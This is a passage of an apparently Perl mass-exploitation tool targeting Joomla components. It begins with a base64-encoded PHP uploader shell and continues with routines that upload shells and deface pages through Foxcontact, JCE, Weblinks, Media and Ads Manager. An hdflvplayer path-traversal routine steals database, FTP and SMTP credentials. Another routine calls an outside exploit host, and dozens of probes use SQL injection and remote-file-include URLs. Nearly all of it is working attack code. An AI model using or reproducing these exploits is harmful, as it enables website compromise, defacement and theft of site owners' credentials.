<?php eval (base64_decode("ZWNobyAnPHRpdGxlPlNlY1hwbG9pdCB2MS4wIDwvdGl0bGU+JzsKZWNobyAnPGNlbnRlcj48aDE+U2VjWHBsb2l0IFVwbG9hZGVyPC9oMT48Y2VudGVyPic7CmlmKCRfR0VUWydYJ109PSJYcGxvaXQiKXsKZWNobyAiPGNlbnRlcj48Yj5VbmFtZToiLnBocF91bmFtZSgpLiI8L2I+IjsgCmVjaG8gJzxmb250IGNvbG9yPSJibGFjayIgc2l6ZT0iNCI+JzsKaWYoaXNzZXQoJF9QT1NUWydTdWJtaXQnXSkpewogICAgJGZpbGVkaXIgPSAiIjsgCiAgICAkbWF4ZmlsZSA9ICcyMDAwMDAwJzsKICAgICRtb2RlID0gJzA2NDQnOwogICAgJHVzZXJmaWxlX25hbWUgPSAkX0ZJTEVTWydpbWFnZSddWyduYW1lJ107CiAgICAkdXNlcmZpbGVfdG1wID0gJF9GSUxFU1snaW1hZ2UnXVsndG1wX25hbWUnXTsKICAgIGlmKGlzc2V0KCRfRklMRVNbJ2ltYWdlJ11bJ25hbWUnXSkpIHsKICAgICAgICAkcXggPSAkZmlsZWRpci4kdXNlcmZpbGVfbmFtZTsKICAgICAgICBAbW92ZV91cGxvYWRlZF9maWxlKCR1c2VyZmlsZV90bXAsICRxeCk7CiAgICAgICAgQGNobW9kICgkcXgsIG9jdGRlYygkbW9kZSkpOwplY2hvIiA8YSBocmVmPSR1c2VyZmlsZV9uYW1lPjxjZW50ZXI+PGI+U3VjZXNzIFVwbG9hZCAhISEgPT0+ICR1c2VyZmlsZV9uYW1lPC9iPjwvY2VudGVyPjwvYT4iOwp9Cn0KZWxzZXsKZWNobyc8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIyIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImltYWdlIj48YnI+PGlucHV0IHR5cGU9IlN1Ym1pdCIgbmFtZT0iU3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsKfQplY2hvICc8L2NlbnRlcj48L2ZvbnQ+JzsKfQ")); ?>';
my $body = $ua->post( $izo,
        Content_Type => 'multipart/form-data',
        Content => $indexa
        );
$foxups="$site/components/com_foxcontact/Xploit.php";
}		
my $checkfoxup = $ua->get("$foxups")->content;
if ($checkfoxup =~ /X Xploit/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact2";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold green'),"[Link] => $foxups\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$foxups\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Foxcontact2";
print color('bold white')," ................... ";
print color('bold red'),"NOT VULN\n";
}
}
}
}
}

############### Jce Img   ####################

sub comjce(){

$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


$exploiturl="/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

$vulnurl=$site.$exploiturl;
$res = $ua->get($vulnurl)->content;
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"JCE Image Upload .................. ";


if ($res =~ m/No function call specified!/i){
my $res = $ua->post($vulnurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["Xploit.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;
if ($res =~ m/"error":false/i){

}else{
    print color('bold red');
print "NOT VULN\n ";
    print color('reset');


}

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$def= "$site/Xploit.gif";
$check = $ua->get($def)->status_line;
if ($check =~ /200/){
    open(TEXT, '>>Result/index.txt');
    print TEXT "[Defaced JCE] $def\n";
    close(TEXT);
    print color('bold green');
	print "[Success]\n";
    print color('reset');
zoneh();



}

}
else{
    print color('bold red');
print  "NOT VULN\n";
    print color('reset');

}
    }

################ comweblink #####################
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autoTEXT => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="Xploit.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$weblinksup= "$site/images/Xploit.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold white')," ...................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $weblinksup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$weblinksup\n";
close (TEXT);
$def = $weblinksup;
zoneh();
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold white')," ...................... ";
print color('bold red'),"NOT VULN\n";
}
}

################ jce shell ###################

sub jceshell(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"[Jce Upload Shell] ................... ";


$drupalink = "http://misterX Xploitbot.com/jce.php";
my $exploit = "$drupalink?url=$site&submit=submit";
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/success/) {

    print color('bold green');
print "[Success]\n";
    print color('reset');
print "$site => User | $admin Password | $pass\n ";
    open(TEXT, '>>Result/shell.txt');
    print TEXT "$site/images/stories/X Xploit3xp.php\n";
    close(TEXT);
    }
else{
    print color('bold red');
print  "NOT VULN\n";
    print color('reset');


        }

}


############### ADS Manger ###################

sub comadsmanegr(){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"[Com Ads Manger ] .................... ";

my $path = "/index.php?option=com_adsmanager&task=upload&tmpl=component";
if($site !~ /http:\/\//) { $target = "http://$site/"; };
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["Xploit1.jpg"], name => "ph.hitachi.html"]);
if ($exploit->decoded_content =~ /ph.hitachi.html/) {
        open(TEXT, '>>Result/index.txt');   
    print TEXT "[ads] $site\n";   
    close(TEXT);

    $def="$site/tmp/plupload/ph.hitachi.html";
my $checkdef = $ua->get("$def")->content;
if($checkdef =~/Powered by Xploit/) {
    print "[Success]\n ";

    zoneh();
    }
}else{
    print color('bold red');
print "NOT VULN\n\n";
    print color('reset');

;
}
}



####################################################################################################
####################################################################################################
######################################COM hdflvplayer##############################################
####################################################################################################
####################################################################################################
sub hdflvplayer(){

# // here for download config but i have to add download cpanel information :p  //
$conflink = "$site/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$resp = $ua->request(HTTP::Request->new(GET => $conflink));
$cont = $resp->content;
if($cont =~ m/class JConfig|mosConfig_offline_message/g){

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com hdflvplayer";
print color('bold white')," ................... ";
print color('reset');
print color('bold green');
print "VULN";
print color('reset');
print color('bold white');
print color('reset');
    open(TEXT, '>>Result/Try manual.txt');   
    print TEXT "[hdflv] $site\n";   
    close(TEXT);
        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
		
        print color("white"),"\t 
        [+]DATABASE INFO\n";
        if ($cont =~ /user = \'(.*?)\';/){
        print color("green"),"\t[+]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($cont =~ /password = \'(.*?)\';/){
        print color("green"),"\t[+]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /db = \'(.*?)\';/){
        print color("green"),"\t[+]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($cont =~ /host = \'(.*?)\';/){
        print color("green"),"\t[+]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($cont =~ /ftp_host = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_port = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_user = \'(.*?)\';/){
        print color("green"),"\t[+]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /ftp_pass = \'(.*?)\';/){
        print color("green"),"\t[+]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($cont =~ /smtpuser = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[+]SMTP User = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtppass = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtpport = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($cont =~ /smtphost = \'(.*?)\';/){
        print color("green"),"\t[+]SMTP Host = $1 \n\n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}

}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com hdflvplayer";
print color('bold white')," ................... ";
print color('reset');
print color('bold red');
print "NOT VULN";
print color('reset');
print color('bold white');
print color('reset');
print " \n";


    }

}


################ Com Media #####################
sub comedia(){
my $url = "$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
my $index ="Xploit.html";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$mediaup="$site/images/Xploit.html";
$checkpofwup = $ua->get("$mediaup")->content;
if($checkpofwup =~/Powered by Xploit/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Media";
print color('bold white')," ......................... ";
print color('bold green'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $mediaup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$mediaup\n";
close (TEXT);
$def = $mediaup;
zoneh();
}else{

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Media";
print color('bold white')," ......................... ";
print color('bold red'),"NOT VULN\n";
}
}

############################################################
sub com_content(){ 
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
             
print color('bold white'),"Com content ....................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_user&view=reset&layout=confirm";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_search(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com search ........................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_admin1(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com admin1 ........................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/admin.admin.html.php?mosConfig_absolute_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_admin2(){              print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com admin2 ........................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/admin.admin.html.php?mosConfig_absolute_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content1(){       print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com content1 ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=archive";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content2(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com content2 ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=archive";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_weblinks(){              print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com weblinks ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_weblinks&view=archive";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_mailto(){              print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com mailto ........................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_mailto&view=archive";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content3(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com content3 ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=article&id=[A VALID ID]&Itemid=[A VALID ID]&sflaction=dir&sflDir=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_content4(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com content4 ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_content&view=article&id=[A VALID ID]&Itemid=[A VALID ID]&sflaction=dir&sflDir=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	

sub com_users(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com users ......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_users&view=archive";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_installer(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com installer ..................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_installer&view=archive";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_search1(){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com search1 ....................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_search&Itemid=1&searchword=%22%3Becho%20md5(911)%3B";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_poll(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com poll .......................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_poll&task=results&id=14&mosmsg=DOS@HERE<<>AAA<><>";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_banners(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com banners ....................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_banners&task=archivesection&id=0'+and+'1'='1::/index.php?option=com_banners&task=archivesection&id=0'+and+'1'='2";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_mailto1(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com mailto1 ....................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/index.php?option=com_mailto&tmpl=mailto&article=550513+and+1=2+union+select+concat(username,char(58),password)+from+jos_users+where+usertype=0x53757065722041646d696e6973747261746f72--&Itemid=1";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_a6mambocredits(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com a6mambocredits ................ ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/admin.a6mambocredits.php?mosConfig_absolute_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_a6mambohelpdesk(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com a6mambohelpdesk ............... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/admin.a6mambohelpdesk.php?mosConfig_live_site=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_advancedpoll(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com advancedpoll .................. ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/admin.advancedpoll.php?mosConfig_live_site=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_akocomment(){             print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
 print color('bold white'),"com akocomment .................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/admin.Akocomment.php?mosConfig_live_site=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_articles(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com articles ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/com_articles.php?absolute_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_artlinks(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com artlinks ...................... ";
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (1);
my $exploitblog = "$site/artlinks.dispnew.php?mosConfig_absolute_path=";
my $checkblog = $ua->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(TEXT,">>Result/Jom-Config.txt");
print TEXT "$exploitblog\n";
close(TEXT);
}else{
    print color('bold red');
    print "NOT VULN";print color('bold white'),"\n";
    print color('reset');
	}}
	
sub com_trade(){            print color('bold red'),"[";
